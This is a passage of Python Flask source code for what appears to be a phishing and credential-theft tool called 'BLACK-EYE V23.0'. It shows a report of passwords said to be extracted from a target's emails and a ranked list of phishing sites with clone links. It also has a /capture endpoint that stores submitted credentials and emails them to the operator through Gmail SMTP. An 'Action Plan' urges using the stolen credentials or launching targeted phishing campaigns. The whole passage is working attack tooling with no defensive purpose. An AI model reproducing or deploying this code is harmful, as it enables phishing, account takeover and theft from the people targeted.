<p><strong>Target:</strong> {target_email}</p>
<p>Scanning inbox for credentials...</p>
<p>Analyzing password patterns...</p>
<p>Extracting saved passwords...</p>
<div class="info">
<strong>⏱️ Processing (30-60 seconds)</strong><br>
Auto-redirecting when complete
</div>
<p style="margin-top:30px"><a href="/dashboard">View Dashboard →</a></p>
</div>
</body>
</html>'''

@app.route('/results')
def results():
    target_email = request.args.get('email')
    
    if not target_email:
        return redirect('/scanner')
    
    conn = sqlite3.connect('intelligence.db', check_same_thread=False)
    
    try:
        # Get extracted passwords - NEW
        cursor = conn.execute('''SELECT service_name, username, password, extraction_method, 
                                email_subject, confidence, extracted_at
                                FROM extracted_passwords
                                WHERE target_email = ?
                                ORDER BY extracted_at DESC LIMIT 50''', (target_email,))
        passwords = cursor.fetchall()
        
        # Get services
        cursor = conn.execute('''SELECT service_name, category, detection_count, priority_score, 
                                confidence_level, service_slug
                                FROM detected_services
                                WHERE target_email = ?
                                ORDER BY priority_score DESC LIMIT 20''', (target_email,))
        services = cursor.fetchall()
        
        # Get behaviors
        cursor = conn.execute('''SELECT behavior_type, SUM(frequency) as total
                                FROM behaviors 
                                WHERE target_email = ?
                                GROUP BY behavior_type
                                ORDER BY total DESC''', (target_email,))
        behaviors = cursor.fetchall()
        
        cursor = conn.execute('SELECT total_scans FROM targets WHERE email = ?', (target_email,))
        scans = cursor.fetchone()
        total_scans = scans[0] if scans else 0
    finally:
        conn.close()
    
    base_url = request.host_url.rstrip('/')
    
    html = f'''<!DOCTYPE html>
<html><head><title>Extraction Results</title>
<style>
body{{font-family:Arial;padding:20px;background:#f5f5f5}}
.container{{max-width:1200px;margin:0 auto;background:#fff;padding:40px;border-radius:8px}}
.header{{background:#dc3545;color:#fff;padding:30px;border-radius:8px;margin-bottom:30px}}
.stat{{background:#28a745;color:#fff;padding:20px;margin:10px 0;border-radius:8px;text-align:center;display:inline-block;width:200px;margin-right:20px}}
.passwords{{background:#fff3cd;padding:25px;margin:30px 0;border-left:5px solid #ffc107;border-radius:4px}}
table{{width:100%;border-collapse:collapse;margin-top:20px}}
th,td{{padding:12px;text-align:left;border-bottom:1px solid #ddd}}
th{{background:#333;color:#fff}}
.high{{color:#28a745;font-weight:bold}}
.medium{{color:#ffc107;font-weight:bold}}
.low{{color:#dc3545}}
.credential{{background:#f8f9fa;padding:8px;border-radius:4px;font-family:monospace;font-weight:bold}}
.link{{background:#28a745;color:#fff;padding:8px 15px;border-radius:4px;text-decoration:none;font-size:14px;font-weight:bold}}
.link:hover{{background:#218838}}
</style></head>
<body>
<div class="container">
<div class="header">
<h1>🔐 Password Extraction Report</h1>
<p><strong>Target:</strong> {target_email}</p>
<p><strong>Generated:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
</div>

<div style="margin-bottom:30px">
<div class="stat">
<h2>{len(passwords)}</h2>
<p>Passwords Extracted</p>
</div>
<div class="stat">
<h2>{len(services)}</h2>
<p>Services Detected</p>
</div>
<div class="stat">
<h2>{total_scans}</h2>
<p>Total Scans</p>
</div>
</div>'''
    
    if passwords:
        html += '''<div class="passwords">
<h2>🔑 Extracted Passwords & Credentials</h2>
<p style="margin-bottom:15px"><strong>Successfully extracted sensitive information from emails:</strong></p>
<table>
<tr><th>Service</th><th>Credential Type</th><th>Extracted Value</th><th>Confidence</th><th>Source Email</th></tr>'''
        
        for pwd in passwords:
            html += f'''<tr>
<td><strong>{pwd[0]}</strong></td>
<td>{pwd[3].replace('_', ' ').title()}</td>
<td><span class="credential">{pwd[2]}</span></td>
<td class="{pwd[5].lower()}">{pwd[5]}</td>
<td style="font-size:12px">{pwd[4][:60]}...</td>
</tr>'''
        
        html += '</table></div>'
    else:
        html += '<div class="passwords"><p>No passwords extracted yet. They may not store passwords in emails or scan needs more time.</p></div>'
    
    html += '''<h2 style="margin-top:40px">🎯 Recommended Phishing Sites</h2>
<table>
<tr><th>Rank</th><th>Service</th><th>Category</th><th>Detections</th><th>Confidence</th><th>Phishing Link</th></tr>'''
    
    for idx, svc in enumerate(services, 1):
        slug = svc[5] if len(svc) > 5 else 'unknown'
        link_available = slug in SITE_TEMPLATES
        link_html = f'<a href="{base_url}/{slug}" class="link" target="_blank">Get Link</a>' if link_available else '<span style="color:#999">N/A</span>'
        
        html += f'''<tr>
<td><strong>#{idx}</strong></td>
<td>{svc[0]}</td>
<td>{svc[1]}</td>
<td>{svc[2]}</td>
<td class="{svc[4].lower()}">{svc[4]}</td>
<td>{link_html}</td>
</tr>'''
    
    html += '</table>'
    
    if behaviors:
        html += '<h2 style="margin-top:40px">📊 Online Behaviors</h2><table><tr><th>Behavior</th><th>Frequency</th></tr>'
        for bhv in behaviors:
            html += f'<tr><td>{bhv[0].replace("_", " ").title()}</td><td>{bhv[1]}</td></tr>'
        html += '</table>'
    
    html += f'''
<div style="margin-top:40px;padding:25px;background:#e7f3ff;border-left:4px solid #007bff;border-radius:4px">
<h3>💡 Action Plan</h3>
<ul>'''
    
    if passwords:
        html += f'<li><strong>Immediate Action:</strong> {len(passwords)} passwords extracted! Use these credentials directly or create targeted phishing campaigns.</li>'
    
    if services:
        top = services[0]
        html += f'<li><strong>Primary Target:</strong> Clone <strong>{top[0]}</strong> ({top[2]} detections, {top[4]} confidence)</li>'
    
    html += '''<li><strong>Strategy:</strong> Combine extracted passwords with phishing links for maximum success rate</li>
</ul>
</div>

<div style="margin-top:30px;text-align:center">
<p><a href="/scanner" style="color:#dc3545;font-size:18px;font-weight:bold">← Extract Another Email</a></p>
<p><a href="/dashboard" style="color:#007bff;font-size:18px;font-weight:bold">View Dashboard →</a></p>
</div>
</div>
</body>
</html>'''
    
    return html

@app.route('/dashboard')
def dashboard():
    conn = sqlite3.connect('intelligence.db', check_same_thread=False)
    
    try:
        cursor = conn.execute('''SELECT t.email, t.first_scan, t.last_scan, t.total_scans,
                                COUNT(DISTINCT ep.id) as password_count
                                FROM targets t
                                LEFT JOIN extracted_passwords ep ON t.email = ep.target_email
                                GROUP BY t.email
                                ORDER BY t.last_scan DESC LIMIT 50''')
        targets = cursor.fetchall()
    finally:
        conn.close()
    
    html = '''<!DOCTYPE html>
<html><head><title>Dashboard</title>
<style>
body{font-family:Arial;padding:20px;background:#f5f5f5}
.container{max-width:1200px;margin:0 auto;background:#fff;padding:40px;border-radius:8px}
h1{color:#333;margin-bottom:30px}
table{width:100%;border-collapse:collapse}
th,td{padding:12px;text-align:left;border-bottom:1px solid #ddd}
th{background:#333;color:#fff}
.btn{background:#007bff;color:#fff;padding:8px 15px;border-radius:4px;text-decoration:none;font-size:14px;margin-right:5px}
.btn:hover{background:#0056b3}
.pwd-badge{background:#dc3545;color:#fff;padding:4px 8px;border-radius:12px;font-size:12px;font-weight:bold}
</style></head>
<body>
<div class="container">
<h1>📊 Intelligence Dashboard</h1>'''
    
    if targets:
        html += '''<table>
<tr><th>Target Email</th><th>First Scan</th><th>Last Scan</th><th>Scans</th><th>Passwords</th><th>Actions</th></tr>'''
        
        for target in targets:
            pwd_count = target[4] if target[4] else 0
            pwd_badge = f'<span class="pwd-badge">{pwd_count} PWD</span>' if pwd_count > 0 else ''
            
            html += f'''<tr>
<td>{target[0]}</td>
<td>{target[1][:10] if target[1] else 'N/A'}</td>
<td>{target[2][:10] if target[2] else 'N/A'}</td>
<td>{target[3]}</td>
<td>{pwd_badge}</td>
<td><a href="/results?email={target[0]}" class="btn">View Report</a></td>
</tr>'''
        
        html += '</table>'
    else:
        html += '<p style="text-align:center;padding:40px;color:#666">No scans yet. <a href="/scanner">Start extracting →</a></p>'
    
    html += '''<p style="margin-top:30px;text-align:center"><a href="/">← Back</a></p>
</div>
</body>
</html>'''
    
    return html

@app.route('/<site>')
def serve_site(site):
    if site in SITE_TEMPLATES:
        return SITE_TEMPLATES[site]
    return "Site not found", 404

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        
        conn = sqlite3.connect('intelligence.db', check_same_thread=False)
        device = "Mobile" if any(x in user_agent for x in ["Mobile", "Android", "iPhone"]) else "Desktop"
        
        conn.execute('''INSERT INTO captures (timestamp, site, ip, credentials, device) 
                        VALUES (?,?,?,?,?)''',
                     (datetime.now().isoformat(), data.get('site', 'unknown'), ip, json.dumps(data), device))
        conn.commit()
        conn.close()
        
        def notify():
            try:
                msg = MIMEText(f"🎯 {data.get('site', 'UNKNOWN').upper()} Capture\n\n{json.dumps(data, indent=2)}\n\nIP: {ip}\nDevice: {device}")
                msg['From'] = ADMIN_EMAIL
                msg['To'] = ADMIN_EMAIL
                msg['Subject'] = f"🎯 {data.get('site', 'UNKNOWN').upper()} Credentials"
                srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
                srv.starttls()
                srv.login(ADMIN_EMAIL, ADMIN_EMAIL_PASS)
                srv.send_message(msg)
                srv.quit()
            except:
                pass
        
        threading.Thread(target=notify, daemon=True).start()
        
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/health')
def health():
    return jsonify({
        "status": "online",
        "version": "23.0",
        "features": ["password-extraction", "email-scanner", "intelligence"]
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("""
╔════════════════════════════════════════════════════════╗
║   BLACK-EYE V23.0 - PASSWORD EXTRACTION EDITION       ║
╚════════════════════════════════════════════════════════╝

🚀 Server starting on port {}

🔐 NEW FEATURES:
   • Automatic password extraction from emails
   • Extracts: passwords, PINs, OTPs, tokens, API keys
   • AI-powered credential detection
   • Confidence scoring system
   • Real-time email reports

📧 Admin: {}
🎯 Password Extractor: ACTIVE
📊 Dashboard: http://localhost:{}/dashboard

Press Ctrl+C to stop
""".format(port, ADMIN_EMAIL, port))
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
